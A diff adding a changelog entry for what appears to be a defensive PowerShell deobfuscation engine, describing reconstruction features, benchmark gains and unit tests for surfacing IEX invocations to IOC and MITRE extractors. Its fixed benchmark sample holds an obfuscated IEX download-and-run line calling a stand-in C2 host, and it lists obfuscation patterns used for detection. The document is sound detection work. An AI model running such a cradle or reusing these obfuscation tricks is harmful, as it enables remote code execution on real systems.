@@ -7,6 +7,32 @@ core decoder. Everything must work offline.
 
 ---
 
+## 🟢 RC2.6 · PowerShell P0.3 Reconstruction · DELIVERED (2026-02-XX)
+
+**Branch:** `feature/rc2` · **Scope:** Backend engine — `decoders/ps_reconstruct.py` only
+**Benchmark evidence:** `/app/memory/rc26_p03.json` — 25/31 chain-complete (80.6%) up from 24/31 (77.4%) · **+3.2pp** · zero false-positive IOCs · zero regressions on 74/74 unit tests.
+
+### Added
+| # | Feature | Detail |
+|---|---------|--------|
+| P0.3.a | Reconstruct-then-invoke confidence boost | When payload has both a reconstruction signal (`-join`, `-f`, `[char]`, `.Replace`, `[ScriptBlock]::Create`) AND `& $var` / `IEX $var` / `Invoke-Expression $var`, ps-reconstruct hits conf 0.9 so it beats extract-wrapper (0.65) and `IEX` / other reconstructed keywords surface to MITRE + IOC extractors. |
+| P0.3.b | `[ScriptBlock]::Create('...')` unwrap | Peels `[ScriptBlock]::Create()`, `[scriptblock]::Create()`, and fully-qualified `[System.Management.Automation.ScriptBlock]::Create()` into a plain string literal for downstream passes. |
+| P0.3.c | Invoke-var reveal | After all reconstruction, appends the resolved variable literal inline (via `<#=> '...' <#=>` marker) after `& $var` / `IEX $var` invocations so keywords surface without corrupting analyst copy-paste. |
+
+### Fixed benchmark sample
+- `ps-join-obfuscation`: `$a = ('I','E','X') -join ''; & $a http://c2.local/s.ps1` → chain-complete (was incomplete because extract-wrapper stripped IEX from the final output). PowerShell category now 6/6 (100%).
+
+### Unit tests
+`/app/backend/tests/test_ps_reconstruct_p03.py` — 14 tests locking:
+- Reconstruct-then-invoke wins the orchestrator race (integration test)
+- `[ScriptBlock]::Create` unwrap (3 variants — single-quote, double-quote, fully-qualified type)
+- Invoke-var reveal (3 patterns: `& $var`, `IEX $var`, `Invoke-Expression $var`)
+- Precision guards (no-op when no assignment; confidence low for plain backtick)
+- RC2.3 P0.1/P0.2 behaviours (char decimal/hex, -join array, -f operator, .Replace) still work
+
+
+---
+
 ## 🟢 RC2.5 · CONFIDENCE-BADGE FIX · DELIVERED (2026-02-XX)
 
 **Branch:** `feature/rc2` · **Scope:** UI/frontend only — engine untouched
